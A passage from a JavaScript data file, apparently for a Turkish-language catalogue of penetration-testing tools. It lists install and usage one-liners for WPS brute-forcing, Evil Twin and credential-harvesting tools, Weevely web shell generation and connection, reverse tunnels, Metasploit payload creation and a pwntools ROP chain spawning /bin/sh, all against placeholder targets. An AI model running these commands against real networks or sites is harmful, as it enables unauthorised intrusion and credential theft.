    features: ['Git geçmişi tarama','100+ secret pattern','GitHub/GitLab/Bitbucket','Regex custom pattern','Entropy tespiti'],
    install: 'sudo apt update && sudo apt install -y trufflehog',
    usage: [{ title: 'GitHub', code: 'trufflehog github --repo https://github.com/org/repo' },{ title: 'Dizin', code: 'trufflehog git file://./repo' },{ title: 'Org', code: 'trufflehog github --org=org --include-merged' }]
  },
  {
    id: 'wapiti',
    name: 'Wapiti',
    desc: 'Web uygulamalarını tarayan açık kaynaklı araç.',
    fullDesc: 'Wapiti, web uygulamalarını black-box şekilde tarar.',
    icon: 'fa-shield-halved',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['Web Tarama', 'Black-box'],
    tagColor: 'cyan',
    features: ['SQL injection/XSS tarama','File inclusion','CRLF injection','Server misconfiguration','JSON rapor'],
    install: 'sudo apt update && sudo apt install -y wapiti',
    usage: [{ title: 'Tarama', code: 'wapiti http://hedef.com' },{ title: 'SQL', code: 'wapiti http://hedef.com -m sql' },{ title: 'JSON', code: 'wapiti http://hedef.com -o rapor.json --format json' }]
  },
  {
    id: 'netdiscover',
    name: 'Netdiscover',
    desc: 'ARP tabanlı ağ keşif ve izleme aracı.',
    fullDesc: 'Netdiscover, ARP istekleri ile ağ cihazlarını keşfeder.',
    icon: 'fa-magnifying-glass-location',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi'],
    tags: ['ARP', 'Ağ Keşfi'],
    tagColor: 'blue',
    features: ['ARP tabanlı keşif','MAC adresi bilgisi','Gerçek zamanlı izleme','ARP flood/sniffing','Filtreleme'],
    install: 'sudo apt update && sudo apt install -y netdiscover',
    usage: [{ title: 'Tarama', code: 'sudo netdiscover -r 192.168.1.0/24' },{ title: 'Aktif', code: 'sudo netdiscover -i eth0 -l' },{ title: 'Sniffing', code: 'sudo netdiscover -i eth0 -p' }]
  },
  {
    id: 'sslscan',
    name: 'SSLscan',
    desc: 'SSL/TLS servisleri ve sertifikaları tarayan araç.',
    fullDesc: 'SSLscan, SSL/TLS servislerini tarar ve zayıf yapılandırmaları bulur.',
    icon: 'fa-lock',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['vulnerability'],
    tags: ['SSL', 'TLS'],
    tagColor: '',
    features: ['SSL/TLS sertifika detayları','Şifre suitleri','Zayıf yapılandırma tespiti','Heartbleed kontrolü','SSLv2/v3 desteği'],
    install: 'sudo apt update && sudo apt install -y sslscan',
    usage: [{ title: 'Tarama', code: 'sslscan hedef.com' },{ title: 'Detaylı', code: 'sslscan --show-certificate hedef.com:443' },{ title: 'JSON', code: 'sslscan --json=hedef.json hedef.com' }]
  },
  {
    id: 'airgeddon',
    name: 'Airgeddon',
    desc: 'Kablosuz ağ çoklu saldırı aracı.',
    fullDesc: 'Airgeddon, kablosuz ağlar için çoklu saldırı modülleri sunar.',
    icon: 'fa-tower-broadcast',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['wireless'],
    tags: ['Wi-Fi', 'Çoklu Saldırı'],
    tagColor: 'purple',
    features: ['WPA/WPA2 handshake','Evil Twin saldırısı','WPS attacks','Portal captive','Dashboard menü'],
    install: 'sudo apt update && sudo apt install -y airgeddon',
    usage: [{ title: 'Başlatma', code: 'sudo airgeddon' },{ title: 'WPA Handshake', code: '# Menüden WPA Handshake seçin' }]
  },
  {
    id: 'bully',
    name: 'Bully',
    desc: 'WPS PIN brute-force aracı.',
    fullDesc: 'Bully, WPS PIN brute-force saldırıları için kullanılır.',
    icon: 'fa-key',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['wireless', 'password'],
    tags: ['WPS', 'Brute Force'],
    tagColor: 'red',
    features: ['WPS PIN brute-force','Pixed/Delayed pin','Session Resume','Çoklu cihaz','Hızlı saldırı'],
    install: 'sudo apt update && sudo apt install -y bully',
    usage: [{ title: 'Tarama', code: 'bully -b MAC -c KANAL wlan0mon' },{ title: 'Brute Force', code: 'bully -b MAC -c KANAL -d 3 wlan0mon' }]
  },
  {
    id: 'reaver',
    name: 'Reaver',
    desc: 'WPS zafiyetlerini sömüren araç.',
    fullDesc: 'Reaver, WiFi Protected Setup (WPS) zafiyetlerini sömürmek için kullanılır.',
    icon: 'fa-signal',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['wireless'],
    tags: ['WPS', 'Sömürü'],
    tagColor: 'orange',
    features: ['WPS PIN brute-force','Brute force Pineapple','Pixie-Dust attack','Session resume','Otomatik mod'],
    install: 'sudo apt update && sudo apt install -y reaver',
    usage: [{ title: 'Tarama', code: 'reaver -i wlan0mon -b MAC -vv' },{ title: 'Pixie-Dust', code: 'reaver -i wlan0mon -b MAC -K 1 -vv' }]
  },
  {
    id: 'pixiewps',
    name: 'Pixiewps',
    desc: 'WPS Pixie-Dust saldırısı aracı.',
    fullDesc: 'Pixiewps, WPS Pixie-Dust saldırısı için kullanılan araçtır.',
    icon: 'fa-wand-magic-sparkles',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['wireless'],
    tags: ['WPS', 'Pixie-Dust'],
    tagColor: 'pink',
    features: ['Pixie-Dust saldırısı','Enerji tabanlı kırma','Hızlı PIN bulma','Reaver ile entegrasyon','Otomatik mod'],
    install: 'sudo apt update && sudo apt install -y pixiewps',
    usage: [{ title: 'Saldırı', code: 'pixiewps -e HASH -s HMAC -a AUTH -n NONCE -m MOD -r REV -d DUMMY' }]
  },
  {
    id: 'fern-wifi-cracker',
    name: 'Fern Wifi Cracker',
    desc: 'Kablosuz ağ güvenliği testi için GUI aracı.',
    fullDesc: 'Fern, kablosuz ağları test etmek için графический arayüzlü bir araçtır.',
    icon: 'fa-wifi',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['wireless'],
    tags: ['Wi-Fi', 'GUI'],
    tagColor: 'cyan',
    features: ['Otomatik anahtar tespiti','WEP/WPA/WPA2 saldırıları','WPS brute-force','Session management','Dashboard menü'],
    install: 'sudo apt update && sudo apt install -y fern-wifi-cracker',
    usage: [{ title: 'Başlatma', code: 'sudo fern-wifi-cracker' }]
  },
  {
    id: 'kismet',
    name: 'Kismet',
    desc: 'Kablosuz ağ algılama ve izleme aracı.',
    fullDesc: 'Kismet, kablosuz ağları algılayan ve izleyen bir araçtır.',
    icon: 'fa-tower-cell',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['wireless', 'bilgi'],
    tags: ['Kablosuz', 'Algılama'],
    tagColor: '',
    features: ['802.11 a/b/g/n algılama','Paket yakalama','Ağ haritası','IDS modu','Drones algılama'],
    install: 'sudo apt update && sudo apt install -y kismet',
    usage: [{ title: 'Başlatma', code: 'sudo kismet' },{ title: 'Kapalı Mod', code: 'sudo kismet -c wlan0mon --capture' }]
  },
  {
    id: 'hostapd-wpe',
    name: 'hostapd-wpe',
    desc: 'Enterprise kablosuz ağ testi aracı.',
    fullDesc: 'hostapd-wpe, 802.1X enterprise kablosuz ağları test etmek için kullanılır.',
    icon: 'fa-building',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['wireless'],
    tags: ['Enterprise', '802.1X'],
    tagColor: 'blue',
    features: ['Enterprise AP oluşturma','EAP-MD5 challenge','RADIUS credential','FreeRADIUS entegrasyon','Otomatik test'],
    install: 'sudo apt update && sudo apt install -y hostapd-wpe',
    usage: [{ title: 'Başlatma', code: 'sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf' },{ title: 'Credential', code: '# /tmp/hostapd-wpe.log dosyasından credential\'ları kontrol edin' }]
  },
  {
    id: 'xfreerdp',
    name: 'xfreerdp',
    desc: 'FreeRDP istemcisi - Uzak Masaüstü bağlantısı.',
    fullDesc: 'xfreerdp, FreeRDP projesinin komut satırı istemcisidir.',
    icon: 'fa-desktop',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi', 'exploit'],
    tags: ['RDP', 'Uzak Masaüstü'],
    tagColor: 'cyan',
    features: ['RDP v8+ desteği','TLS 1.2/1.3','Multi-monitor','Drive redirection','Clipboard paylaşımı'],
    install: 'sudo apt update && sudo apt install -y freerdp2-x11',
    usage: [{ title: 'Bağlantı', code: 'xfreerdp /v:192.168.1.100 /u:admin /p:pass123' },{ title: 'Drive Paylaşımı', code: 'xfreerdp /v:192.168.1.100 /u:admin /p:pass /drive:home,/tmp' }]
  },
  {
    id: 'rdesktop',
    name: 'rdesktop',
    desc: 'Eski nesil RDP istemcisi.',
    fullDesc: 'rdesktop, Windows uzak masaüstü bağlantısı için eski nesil bir araçtır.',
    icon: 'fa-display',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi'],
    tags: ['RDP', 'Eski Nesil'],
    tagColor: 'blue',
    features: ['RDP 5/6 desteği','Sound yönlendirme','Disk paylaşımı','Clipboard','SSL desteği'],
    install: 'sudo apt update && sudo apt install -y rdesktop',
    usage: [{ title: 'Bağlantı', code: 'rdesktop 192.168.1.100' },{ title: 'Kullanıcı', code: 'rdesktop -u admin -p pass123 192.168.1.100' }]
  },
  {
    id: 'freerdp2-x11',
    name: 'FreeRDP',
    desc: 'Gelişmiş RDP protokolü uygulaması.',
    fullDesc: 'FreeRDP, RDP protokolünün açık kaynaklı uygulamasıdır.',
    icon: 'fa-desktop',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi', 'exploit'],
    tags: ['RDP', 'Açık Kaynak'],
    tagColor: '',
    features: ['RDP 10 desteği','TLS 1.3','HTTP proxy','GFX remoting','Kerberos/NTLM auth'],
    install: 'sudo apt update && sudo apt install -y freerdp2-x11',
    usage: [{ title: 'Bağlantı', code: 'xfreerdp /v:192.168.1.100 /u:admin /p:pass' },{ title: 'Kerberos', code: 'xfreerdp /v:192.168.1.100 /u:admin /k /cert:ignore' }]
  },
  {
    id: 'proxychains4',
    name: 'ProxyChains',
    desc: 'Trafiği proxy üzerinden yönlendiren araç.',
    fullDesc: 'ProxyChains, TCP trafiğini SOCKS/HTTP proxy üzerinden yönlendirir.',
    icon: 'fa-link',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['bilgi'],
    tags: ['Proxy', 'Anonimlik'],
    tagColor: 'purple',
    features: ['SOCKS4/5 proxy desteği','HTTP CONNECT proxy','DNS yönlendirme','Proxy zinciri','Tor entegrasyonu'],
    install: 'sudo apt update && sudo apt install -y proxychains4',
    usage: [{ title: 'Tor ile', code: 'proxychains4 nmap -sT -Pn hedef.com' },{ title: 'Özel Proxy', code: 'proxychains4 curl http://hedef.com' },{ title: 'SSH', code: 'proxychains4 ssh user@hedef.com' }]
  },
  {
    id: 'tor',
    name: 'Tor',
    desc: 'Anonim internet erişimi sağlayan ağ.',
    fullDesc: 'Tor, internet trafiğini şifreleyerek anonimlik sağlayan bir ağdır.',
    icon: 'fa-mask',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi'],
    tags: ['Anonimlik', 'Tor'],
    tagColor: 'cyan',
    features: ['Çoklu relay yönlendirme','Onion routing','.onion siteleri','Şifreli trafik','Gizli servis'],
    install: 'sudo apt update && sudo apt install -y tor',
    usage: [{ title: 'Başlatma', code: 'sudo systemctl start tor' },{ title: 'SOCKS Proxy', code: 'tor --SocksPort 9050' },{ title: 'Onion', code: 'curl --socks5-hostname 127.0.0.1:9050 hedef.onion' }]
  },
  {
    id: 'torsocks',
    name: 'torsocks',
    desc: 'Tor ağı üzerinden trafik yönlendiren araç.',
    fullDesc: 'torsocks, herhangi bir uygulamanın trafiğini Tor üzerinden yönlendirir.',
    icon: 'fa-route',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['Tor', 'Anonimlik'],
    tagColor: '',
    features: ['Tor yönlendirme','Herhangi uygulama desteği','DNS yönlendirme','Kolay kullanım','Gizli servis desteği'],
    install: 'sudo apt update && sudo apt install -y torsocks',
    usage: [{ title: 'Tor ile Nmap', code: 'torsocks nmap -sT -Pn hedef.com' },{ title: 'Tor ile Curl', code: 'torsocks curl http://hedef.com' }]
  },
  {
    id: 'chisel',
    name: 'Chisel',
    desc: 'TCP/UDP tünel oluşturma aracı.',
    fullDesc: 'Chisel, hızlı ve şifreli TCP/UDP tünel oluşturma için kullanılır.',
    icon: 'fa-tunnel',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['exploit'],
    tags: ['Tünel', 'Port Forwarding'],
    tagColor: 'orange',
    features: ['TCP/UDP tünel','SSH benzeri şifreleme','Çoklu port','Reverse tunnel','Hızlı performans'],
    install: 'sudo apt update && sudo apt install -y chisel',
    usage: [{ title: 'Sunucu', code: 'chisel server --reverse --port 8080' },{ title: 'İstemci', code: 'chisel client hedef.com:8080 8888:localhost:3306' }]
  },
  {
    id: 'ligolo-ng',
    name: 'Ligolo-ng',
    desc: 'Tünel ve proxy aracı.',
    fullDesc: 'Ligolo-ng, penetrasyon testlerinde tünel ve proxy oluşturmak için kullanılır.',
    icon: 'fa-circle-nodes',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit'],
    tags: ['Tünel', 'Proxy'],
    tagColor: '',
    features: ['Yönlendirme tüneli','Çoklu agent','Kernel proxy','Şifreli iletişim','Kolay kurulum'],
    install: 'sudo apt update && sudo apt install -y ligolo-ng',
    usage: [{ title: 'Sunucu', code: 'ligolo-ng-proxy -selfcert -laddr 0.0.0.0:11601' },{ title: 'Agent', code: './ligolo-ng-agent -connect SUNUCU:11601 -retry' }]
  },
  {
    id: 'plink',
    name: 'PuTTY Link (plink)',
    desc: 'SSH tüneli ve port forwarding aracı.',
    fullDesc: 'plink, PuTTY\'nin komut satırı tünel aracıdır.',
    icon: 'fa-link',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi', 'exploit'],
    tags: ['SSH', 'Tünel'],
    tagColor: 'blue',
    features: ['SSH port forwarding','Reverse tunnel','SSL/TLS desteği','Batch mod','Proxy desteği'],
    install: 'sudo apt update && sudo apt install -y plink',
    usage: [{ title: 'Port Forward', code: 'plink -L 8080:localhost:80 user@hedef.com' },{ title: 'Reverse', code: 'plink -R 4444:localhost:4444 user@hedef.com' }]
  },
  {
    id: 'sshuttle',
    name: 'sshuttle',
    desc: 'SSH tabanlı VPN tünel aracı.',
    fullDesc: 'sshuttle, SSH üzerinden VPN tüneli oluşturmak için kullanılır.',
    icon: 'fa-shield-halved',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi'],
    tags: ['SSH', 'VPN'],
    tagColor: 'cyan',
    features: ['SSH VPN tüneli','DNS yönlendirme','Çoklu alt ağ','Parola/anahtar auth','Otomatik route'],
    install: 'sudo apt update && sudo apt install -y sshuttle',
    usage: [{ title: 'VPN', code: 'sshuttle -r user@hedef.com 10.0.0.0/8' },{ title: 'DNS', code: 'sshuttle --dns -r user@hedef.com 0/0' }]
  },
  {
    id: 'pwntools',
    name: 'Pwntools',
    desc: 'CTF ve exploit geliştirme için Python kütüphanesi.',
    fullDesc: 'Pwntools, CTF yarışmaları ve exploit geliştirme için güçlü bir Python kütüphanesidir.',
    icon: 'fa-python',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['exploit'],
    tags: ['CTF', 'Python', 'Exploit'],
    tagColor: 'orange',
    features: ['Gelişmiş ROP','Shellcode oluşturma','Fmt string attacks','GDB entegrasyonu','Interaktif shell'],
    install: 'pip3 install pwntools',
    usage: [{ title: 'Bağlantı', code: 'p = remote("hedef.com", 1337)' },{ title: 'Local', code: 'p = process("./vuln")' },{ title: 'ROP Chain', code: 'rop = ROP(elf); rop.call("system", [next(elf.search(b"/bin/sh"))])' }]
  },
  {
    id: 'ropper',
    name: 'Ropper',
    desc: 'ROP gadget bulma aracı.',
    fullDesc: 'Ropper, binary dosyalarda ROP gadget\'ları bulmak için kullanılır.',
    icon: 'fa-link',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['ROP', 'Gadget'],
    tagColor: 'red',
    features: ['ROP gadget bulma','JOP/SYSRET gadget','Çoklu format desteği','Filtreleme','Otomatik chain'],
    install: 'pip3 install ropper',
    usage: [{ title: 'Gadget Bul', code: 'ropper -f ./binary --search "pop rdi"' },{ title: 'Tümü', code: 'ropper -f ./binary' }]
  },
  {
    id: 'checksec',
    name: 'checksec',
    desc: 'Binary güvenlik özelliklerini kontrol eden araç.',
    fullDesc: 'checksec, executable dosyaların güvenlik özelliklerini (ASLR, NX, PIE vb.) kontrol eder.',
    icon: 'fa-shield-halved',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['vulnerability'],
    tags: ['Binary', 'Hardening'],
    tagColor: '',
    features: ['ASLR/NX/PIE/RELRO kontrolü','Güvenlik analizi','Çoklu format','Detaylı çıktı','Renkli rapor'],
    install: 'sudo apt update && sudo apt install -y checksec',
    usage: [{ title: 'Kontrol', code: 'checksec --file=./binary' },{ title: 'ELF', code: 'checksec --file=/usr/bin/ls' }]
  },
  {
    id: 'one_gadget',
    name: 'one_gadget',
    desc: 'libc\'de tek gadget bulma aracı.',
    fullDesc: 'one_gadget, libc kütüphanesinde tek gadget ile shell açılmasını sağlayan adresleri bulur.',
    icon: 'fa-crosshairs',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['exploit'],
    tags: ['Gadget', 'libc'],
    tagColor: 'pink',
    features: ['Tek gadget bulma','ASLR-aware','Çoklu libc desteği','JIT compilation','Detaylı çıktı'],
    install: 'gem install one_gadget',
    usage: [{ title: 'Bul', code: 'one_gadget /lib/x86_64-linux-gnu/libc.so.6' },{ title: 'Gelişmiş', code: 'one_gadget libc.so.6 --level=3' }]
  },
  {
    id: 'armitage',
    name: 'Armitage',
    desc: 'Metasploit için grafik arayüz.',
    fullDesc: 'Armitage, Metasploit Framework için Java tabanlı grafik arayüzdür.',
    icon: 'fa-chess-knight',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit'],
    tags: ['Metasploit', 'GUI'],
    tagColor: 'red',
    features: ['Grafik Metasploit arayüzü','Otomatik exploit','Takım çalışması','Görsel ağ haritası','Rapor oluşturma'],
    install: 'sudo apt update && sudo apt install -y armitage',
    usage: [{ title: 'Başlatma', code: 'sudo armitage' },{ title: 'Connect', code: '# Metasploit connection ayarlarını yapın' }]
  },
  {
    id: 'msfpc',
    name: 'MSF-Payload-Creator',
    desc: 'Metasploit payload oluşturma aracı.',
    fullDesc: 'MSF-Payload-Creator (msfpc), hızlı bir şekilde Metasploit payload\'ları oluşturmak için kullanılır.',
    icon: 'fa-syringe',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['exploit'],
    tags: ['Payload', 'Metasploit'],
    tagColor: 'purple',
    features: ['Otomatik payload oluşturma','Çoklu platform','Meterpreter support','Web shell oluşturma','Batch mod'],
    install: 'sudo apt update && sudo apt install -y msfpc',
    usage: [{ title: 'Payload Oluştur', code: 'msfpc payload windows' },{ title: 'Linux', code: 'msfpc payload linux' }]
  },
  {
    id: 'set',
    name: 'Social Engineering Toolkit',
    desc: 'Sosyal mühendislik saldırıları için framework.',
    fullDesc: 'SET, sosyal mühendislik saldırıları için tasarlanmış kapsamlı bir framework\'tür.',
    icon: 'fa-user-secret',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['exploit'],
    tags: ['Sosyal Mühendislik', 'Phishing'],
    tagColor: 'pink',
    features: ['Spear phishing','Credential harvester','Website attack vectors','Mass mailer','USB/disk attack'],
    install: 'sudo apt update && sudo apt install -y set',
    usage: [{ title: 'Başlatma', code: 'sudo setoolkit' },{ title: 'Credential Harvester', code: '# Menü: 1 > 2 > 3' }]
  },
  {
    id: 'weevely',
    name: 'Weevely',
    desc: 'Web shell oluşturma ve yönetme aracı.',
    fullDesc: 'Weevely, PHP web shell\'leri oluşturmak ve yönetmek için kullanılır.',
    icon: 'fa-terminal',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit', 'web'],
    tags: ['Web Shell', 'PHP'],
    tagColor: '',
    features: ['Otomatik shell oluşturma','Şifreli iletişim','100+ komut','File manager','Database erişimi'],
    install: 'sudo apt update && sudo apt install -y weevely',
    usage: [{ title: 'Shell Oluştur', code: 'weevely generate password shell.php' },{ title: 'Bağlantı', code: 'weevely http://hedef.com/shell.php password' }]
  },
  {
    id: 'cadaver',
    name: 'Cadaver',
    desc: 'WebDAV istemcisi.',
    fullDesc: 'Cadaver, WebDAV sunucularıyla etkileşim için komut satırı aracıdır.',
    icon: 'fa-folder-open',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['web', 'exploit'],
    tags: ['WebDAV', 'Dosya'],
    tagColor: 'blue',
    features: ['WebDAV dosya yönetimi','PUT/GET/MKCOL','Digest auth desteği','Batch komut','SSL desteği'],
    install: 'sudo apt update && sudo apt install -y cadaver',
    usage: [{ title: 'Bağlantı', code: 'cadaver http://hedef.com/webdav/' },{ title: 'Yükleme', code: 'put dosya.txt' }]
  },
  {
    id: 'davtest',
    name: 'DavTest',
    desc: 'WebDAV zafiyet testi aracı.',
    fullDesc: 'DavTest, WebDAV sunucularındaki zafiyetleri test eder.',
    icon: 'fa-bug',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['WebDAV', 'Zafiyet'],
    tagColor: 'red',
    features: ['WebDAV zafiyet testi','Upload testleri','Extension brute-force','Detaylı çıktı','Otomatik mod'],
    install: 'sudo apt update && sudo apt install -y davtest',
    usage: [{ title: 'Test', code: 'davtest -url http://hedef.com/webdav/' },{ title: 'Upload', code: 'davtest -uploadfile test.txt -url http://hedef.com/webdav/' }]
  },
  {
    id: 'whatweb',
    name: 'WhatWeb',
    desc: 'Web teknolojilerini tanımlama aracı.',
    fullDesc: 'WhatWeb, web sitelerinin kullandığı teknolojileri tespit eder.',
    icon: 'fa-code',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Teknoloji', 'Fingerprint'],
    tagColor: '',
    features: ['1800+ plugin','CMS tespiti','JS kütüphaneleri','Server OS tespiti','Header analizi'],
    install: 'sudo apt update && sudo apt install -y whatweb',
    usage: [{ title: 'Tarama', code: 'whatweb hedef.com' },{ title: 'Agregasyon', code: 'whatweb -a 3 hedef.com' },{ title: 'JSON', code: 'whatweb --log-json=output.json hedef.com' }]
  },
  {
    id: 'wafw00f',
    name: 'wafw00f',
    desc: 'Web Application Firewall (WAF) tespit aracı.',
    fullDesc: 'wafw00f, web sitelerindeki WAF\'ları tespit eder.',
    icon: 'fa-shield-halved',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['WAF', 'Tespit'],
    tagColor: 'cyan',
    features: ['150+ WAF tespiti','Otomatik tespit','Fingerprinting','Detaylı çıktı','Proxy desteği'],
    install: 'sudo apt update && sudo apt install -y wafw00f',
    usage: [{ title: 'Tespit', code: 'wafw00f hedef.com' },{ title: 'Tümü', code: 'wafw00f -a hedef.com' }]
  },
  {
    id: 'nuclei',
    name: 'Nuclei',
    desc: 'Hızlı ve özelleştirilebilir zafiyet tarayıcısı.',
    fullDesc: 'Nuclei, template tabanlı hızlı bir zafiyet tarayıcısıdır.',
    icon: 'fa-atom',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['Zafiyet', 'Template'],
    tagColor: 'orange',
    features: ['Template tabanlı tarama','8000+ template','Hızlı tarama','Çoklu hedef','Çıktı formatları'],
    install: 'sudo apt update && sudo apt install -y nuclei',
    usage: [{ title: 'Tarama', code: 'nuclei -u http://hedef.com' },{ title: 'Hedef Listesi', code: 'nuclei -l hedefler.txt' },{ title: 'Özel Template', code: 'nuclei -u hedef.com -t cves/' }]
  },
  {
    id: 'katana',
    name: 'Katana',
    desc: 'Web crawling ve spidering aracı.',
    fullDesc: 'Katana, web sitelerini otomatik olarak crawl eden modern bir araçtır.',
    icon: 'fa-spider',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Crawl', 'Spider'],
    tagColor: 'purple',
    features: ['JavaScript rendering','Form doldurma','Headless browser','Çoklu crawl modu','Çıktı filtreleme'],
    install: 'sudo apt update && sudo apt install -y katana',
    usage: [{ title: 'Crawl', code: 'katana -u http://hedef.com' },{ title: 'Derin', code: 'katana -u http://hedef.com -d 5 -jc' },{ title: 'Form', code: 'katana -u http://hedef.com -form' }]
  },
  {
    id: 'subfinder',
    name: 'Subfinder',
    desc: 'Alt alan adı keşfetme aracı.',
    fullDesc: 'Subfinder, passive mode ile alt alan adı keşfetmek için kullanılır.',
    icon: 'fa-sitemap',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi'],
    tags: ['Subdomain', 'Passive'],
    tagColor: 'blue',
    features: ['Passive subdomain keşfi','30+source','Çoklu output','Silent mod','Rate limiting'],
    install: 'sudo apt update && sudo apt install -y subfinder',
    usage: [{ title: 'Keşif', code: 'subfinder -d hedef.com' },{ title: 'Silent', code: 'subfinder -d hedef.com -silent' },{ title: 'Kaynak', code: 'subfinder -d hedef.com -all' }]
  },
  {
    id: 'httpx',
    name: 'httpx',
    desc: 'HTTP probe ve analiz aracı.',
    fullDesc: 'httpx, listelerdeki URL\'leri probe eden hızlı bir araçtır.',
    icon: 'fa-globe',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi', 'web'],
    tags: ['HTTP', 'Probe'],
    tagColor: '',
    features: ['HTTP/HTTPS probe','Status code tespiti','Tecnology detection','Title extraction','JSON çıktı'],
    install: 'sudo apt update && sudo apt install -y httpx',
    usage: [{ title: 'Probe', code: 'httpx -l urls.txt' },{ title: 'Detaylı', code: 'httpx -l urls.txt -title -tech-detect -status-code' },{ title: 'JSON', code: 'httpx -l urls.txt -json' }]
  },
  {
    id: 'ffuf',
    name: 'FFUF',
    desc: 'Hızlı web fuzzer aracı.',
    fullDesc: 'FFUF, web uygulamalarında fuzzing yapmak için hızlı bir araçtır.',
    icon: 'fa-bolt',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['web'],
    tags: ['Fuzzing', 'Brute Force'],
    tagColor: 'red',
    features: ['Çoklu fuzzing modu','Hızlı performans','Wildcard detection','Çıktı filtreleme','Matcher/Filter'],
    install: 'sudo apt update && sudo apt install -y ffuf',
    usage: [{ title: 'Dizin Fuzz', code: 'ffuf -u http://hedef.com/FUZZ -w wordlist.txt' },{ title: 'Param Fuzz', code: 'ffuf -u http://hedef.com/?FUZZ=test -w wordlist.txt' },{ title: 'Header Fuzz', code: 'ffuf -u http://hedef.com -H "X-Forwarded-For: FUZZ" -w ips.txt' }]
  },
  {
    id: 'dirsearch',
    name: 'DirSearch',
    desc: 'Web dizin ve dosya tarama aracı.',
    fullDesc: 'DirSearch, web sunucularında gizli dizin ve dosyaları tarar.',
    icon: 'fa-search',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Dizin', 'Tarama'],
    tagColor: 'cyan',
    features: ['Otomatik tarama','Çoklu uzantı','Recursive tarama','Filtreleme','Çıktı formatları'],
    install: 'sudo apt update && sudo apt install -y dirsearch',
    usage: [{ title: 'Tarama', code: 'dirsearch -u http://hedef.com/' },{ title: 'Uzantı', code: 'dirsearch -u http://hedef.com/ -e php,txt,html' },{ title: 'Recursive', code: 'dirsearch -u http://hedef.com/ -r' }]
  },
  {
    id: 'feroxbuster',
    name: 'Feroxbuster',
    desc: 'Rust tabanlı hızlı dizin tarama aracı.',
    fullDesc: 'Feroxbuster, Rust ile yazılmış çok hızlı bir dizin tarama aracıdır.',
    icon: 'fa-folder-tree',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Dizin', 'Hızlı'],
    tagColor: 'orange',
    features: ['Rust tabanlı hız','Recursive tarama','Filters','Çıktı formatları','Thread yönetimi'],
    install: 'sudo apt update && sudo apt install -y feroxbuster',
    usage: [{ title: 'Tarama', code: 'feroxbuster -u http://hedef.com' },{ title: 'Recursive', code: 'feroxbuster -u http://hedef.com -x php,txt -w wordlist.txt' }]
  },
  {
    id: 'crunch',
    name: 'Crunch',
    desc: 'Wordlist oluşturma aracı.',
    fullDesc: 'Crunch, özel wordlist\'ler oluşturmak için kullanılır.',
    icon: 'fa-file-lines',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['password'],
    tags: ['Wordlist', 'Oluşturma'],
    tagColor: 'purple',
    features: ['Özel karakter setleri','Minimum/maksimum uzunluk','Pattern desteği','Dosyaya çıktı','Sıkıştırma'],
    install: 'sudo apt update && sudo apt install -y crunch',
    usage: [{ title: '8 Karakter', code: 'crunch 8 8 -t @@@@%%%% -o wordlist.txt' },{ title: 'Numerik', code: 'crunch 4 4 0123456789 -o pin.txt' }]
  },
  {
    id: 'wordlists',
    name: 'SecLists',
    desc: 'Güvenlik testleri için wordlist koleksiyonu.',
    fullDesc: 'SecLists, güvenlik testlerinde kullanılan kapsamlı wordlist koleksiyonudur.',
    icon: 'fa-book',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['password', 'bilgi'],
